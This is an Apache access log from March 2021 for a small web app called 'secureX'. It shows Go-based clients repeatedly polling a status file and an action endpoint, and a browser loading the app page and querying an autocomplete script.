35.173.236.211 - - [29/Mar/2021:19:59:00 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
35.173.236.211 - - [29/Mar/2021:19:58:59 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
34.201.1.41 - - [29/Mar/2021:19:58:59 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
35.173.236.211 - - [29/Mar/2021:19:59:01 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
34.201.1.41 - - [29/Mar/2021:19:59:04 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
34.201.1.41 - - [29/Mar/2021:19:59:05 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
35.173.236.211 - - [29/Mar/2021:19:59:06 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
91.166.71.69 - - [29/Mar/2021:19:59:07 +0200] "GET /secureX/index.html HTTP/1.1" 200 1100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:19:59:07 +0200] "GET /secureX/bootstrap/css/bootstrap.css HTTP/1.1" 200 17074 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:19:59:07 +0200] "GET /secureX/action.js HTTP/1.1" 200 584 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:19:59:07 +0200] "GET /secureX/jquery.min.js HTTP/1.1" 200 33669 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:19:59:07 +0200] "GET /secureX/images/secureX-1.png HTTP/1.1" 200 341486 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:19:59:07 +0200] "GET /secureX/sons/hi_patrick.mp3 HTTP/1.1" 206 24285 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
35.173.236.211 - - [29/Mar/2021:19:59:05 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
35.173.236.211 - - [29/Mar/2021:19:59:05 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
34.201.1.41 - - [29/Mar/2021:19:59:07 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
35.173.236.211 - - [29/Mar/2021:19:59:10 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
35.173.236.211 - - [29/Mar/2021:19:59:11 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
34.201.1.41 - - [29/Mar/2021:19:59:12 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
35.173.236.211 - - [29/Mar/2021:19:59:11 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
34.201.1.41 - - [29/Mar/2021:19:59:11 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
91.166.71.69 - - [29/Mar/2021:19:59:15 +0200] "GET /secureX/gethint.php?q=h HTTP/1.1" 200 207 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:19:59:16 +0200] "GET /secureX/gethint.php?q=he HTTP/1.1" 200 206 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:19:59:16 +0200] "GET /secureX/gethint.php?q=hel HTTP/1.1" 200 206 "http://82.121.247.198/secureX/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
35.173.236.211 - - [29/Mar/2021:19:59:13 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
